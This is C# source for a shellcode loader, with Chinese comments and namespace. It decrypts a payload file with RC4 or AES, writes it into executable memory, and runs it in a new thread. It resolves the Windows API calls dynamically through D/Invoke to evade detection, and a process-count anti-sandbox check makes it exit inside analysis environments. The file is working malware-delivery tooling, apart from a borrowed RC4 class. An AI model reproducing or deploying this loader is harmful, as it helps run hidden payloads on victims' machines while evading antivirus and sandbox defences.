using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Security.Cryptography;
using System.IO;
using static Shellcode解密加载.DELEGATES;


namespace Shellcode解密加载
{
    internal class Program
    {
        static void Main(string[] args)
        {
            CheckProcessCountAndExit();
            if (args.Length != 3)
            {
                Console.WriteLine("Args count Error! The program need 3 args");
            }
            
            string payload_path = args[0];
            string decryption = args[1];
            string key = args[2];
            byte[] code = null;

            if (decryption == "rc4")
            {
                code = RC4_Decrypt(key, File.ReadAllBytes(payload_path));
            }
            else if (decryption == "aes")
            {
                code = AES_Decrypt(key, File.ReadAllBytes(payload_path));
            }
            else
            {
                Console.WriteLine("The input of Arg 2 is rc4 or aes");
            }

            IntPtr func_ptr = IntPtr.Zero;

            var VirtualAllocRx = GetFunctionDelegate<DELEGATES.VirtualAllocRx>("kernel32.dll", "VirtualAlloc");
            IntPtr rMemAddress = VirtualAllocRx(0, (uint)code.Length, 0x1000 | 0x2000, 0x40);
            
            Marshal.Copy(code, 0, (IntPtr)(rMemAddress), code.Length);
            IntPtr hThread = IntPtr.Zero;
            IntPtr pinfo = IntPtr.Zero;
            UInt32 threadId = 0;

            var CreateThreadRx = GetFunctionDelegate<DELEGATES.CreateThreadRx>("kernel32.dll", "CreateThread");
            hThread = CreateThreadRx(0, 0, rMemAddress, pinfo, 0, ref threadId);

            var WaitForSingleObjectRx = GetFunctionDelegate<DELEGATES.WaitForSingleObjectRx>("kernel32.dll", "WaitForSingleObject");
            WaitForSingleObjectRx(hThread, 0xFFFFFFFF);
        }

        // 获取函数委托
        private static T GetFunctionDelegate<T>(string dllName, string functionName) where T : class
        {
            IntPtr funcAddress = DInvokeFunctions.GetLibraryAddress(dllName, functionName);
            return Marshal.GetDelegateForFunctionPointer(funcAddress, typeof(T)) as T;
        }

        // RC4解密函数
        public static byte[] RC4_Decrypt(string key, byte[] data)
        {
            byte[] bkey = Encoding.UTF8.GetBytes(key);

            byte[] dec = RC4.Apply(data, bkey);

            return dec;
        }

        // AES解密函数
        public static byte[] AES_Decrypt(string key, byte[] data)
        {
            byte[] dec;

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);

                Console.WriteLine("[*] Key bytes: " + aes.Key.Length);
                Console.WriteLine("[*] Padding mode: " + (byte)aes.Padding);
                Console.WriteLine("[*] AES keysize: " + aes.KeySize);
                Console.WriteLine("[*] AES blockSize: " + aes.BlockSize);

                using (MemoryStream ms = new MemoryStream(data))
                {
                    // 从数据中读取IV
                    byte[] iv = new byte[16];
                    ms.Read(iv, 0, iv.Length);
                    aes.IV = iv;

                    // 输出IV信息
                    Console.WriteLine("[*] IV length: " + aes.IV.Length);
                    Console.WriteLine("[*] IV bytes: " + BitConverter.ToString(aes.IV));
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream((Stream)ms, aes.CreateDecryptor(aes.Key, aes.IV), CryptoStreamMode.Write))
                    {
                        //Provide IV offset, expected length of decrypted plaintext, and write to CryptoStream
                        int DecryptedLength = (data.Length - aes.IV.Length);
                        cs.Write(data, aes.IV.Length, DecryptedLength);
                        cs.Close();
                    }

                    dec = ms.ToArray();
                    ms.Close();
                }
            }
            //Console.WriteLine("[*] Decrypted Bytes:" + dec);
            return dec;
        }

        // 利用检测进程数实现反沙箱
        private static void CheckProcessCountAndExit()
        {
            var processCount = Process.GetProcesses().Length;
            if (processCount < 40)
            {
                Console.WriteLine("Less than 40 processes are running. Exiting...");
                Environment.Exit(0);
            }
        }
    }
    public static class RC4
    {
        /// RC4 class sourced from: https://github.com/manbeardgames/RC4
        /// MIT License
        /// <summary>
        ///     Give data and an encryption key, apply RC4 cryptography.  RC4 is symmetric,
        ///     which means this single method will work for encrypting and decrypting.
        /// </summary>
        /// <remarks>
        ///     https://en.wikipedia.org/wiki/RC4
        /// </remarks>
        /// <param name="data">
        ///     Byte array representing the data to be encrypted/decrypted
        /// </param>
        /// <param name="key">
        ///     Byte array representing the key to use
        /// </param>
        /// <returns>
        ///     Byte array representing the encrypted/decrypted data.
        /// </returns>
        public static byte[] Apply(byte[] data, byte[] key)
        {
            //  Key Scheduling Algorithm Phase:
            //  KSA Phase Step 1: First, the entries of S are set equal to the values of 0 to 255 
            //                    in ascending order.
            int[] S = new int[256];
            for (int _ = 0; _ < 256; _++)
            {
                S[_] = _;
            }

            //  KSA Phase Step 2a: Next, a temporary vector T is created.
            int[] T = new int[256];

            //  KSA Phase Step 2b: If the length of the key k is 256 bytes, then k is assigned to T.  
            if (key.Length == 256)
            {
                Buffer.BlockCopy(key, 0, T, 0, key.Length);
            }
            else
            {
                //  Otherwise, for a key with a given length, copy the elements of
                //  the key into vector T, repeating for as many times as neccessary to
                //  fill T
                for (int _ = 0; _ < 256; _++)
                {
                    T[_] = key[_ % key.Length];
                }
            }

            //  KSA Phase Step 3: We use T to produce the initial permutation of S ...
            int i = 0;
            int j = 0;
            for (i = 0; i < 256; i++)
            {
                //  increment j by the sum of S[i] and T[i], however keeping it within the 
                //  range of 0 to 255 using mod (%) division.
                j = (j + S[i] + T[i]) % 256;

                //  Swap the values of S[i] and S[j]
                int temp = S[i];
                S[i] = S[j];
                S[j] = temp;
            }

            //  Pseudo random generation algorithm (Stream Generation):
            //  Once the vector S is initialized from above in the Key Scheduling Algorithm Phase,
            //  the input key is no longer used.  In this phase, for the length of the data, we ...
            i = j = 0;
            byte[] result = new byte[data.Length];
            for (int iteration = 0; iteration < data.Length; iteration++)
            {
                //  PRGA Phase Step 1. Continously increment i from 0 to 255, starting it back 
                //                     at 0 once we go beyond 255 (this is done with mod (%) division
                i = (i + 1) % 256;

                //  PRGA Phase Step 2. Lookup the i'th element of S and add it to j, keeping the
                //                     result within the range of 0 to 255 using mod (%) division
                j = (j + S[i]) % 256;

                //  PRGA Phase Step 3. Swap the values of S[i] and S[j]
                int temp = S[i];
                S[i] = S[j];
                S[j] = temp;

                //  PRGA Phase Step 4. Use the result of the sum of S[i] and S[j], mod (%) by 256, 
                //                     to get the index of S that handls the value of the stream value K.
                int K = S[(S[i] + S[j]) % 256];

                //  PRGA Phase Step 5. Use bitwise exclusive OR (^) with the next byte in the data to
                //                     produce  the next byte of the resulting ciphertext (when 
                //                     encrypting) or plaintext (when decrypting)
                result[iteration] = Convert.ToByte(data[iteration] ^ K);
            }

            //  return the result
            return result;
        }
    }
}
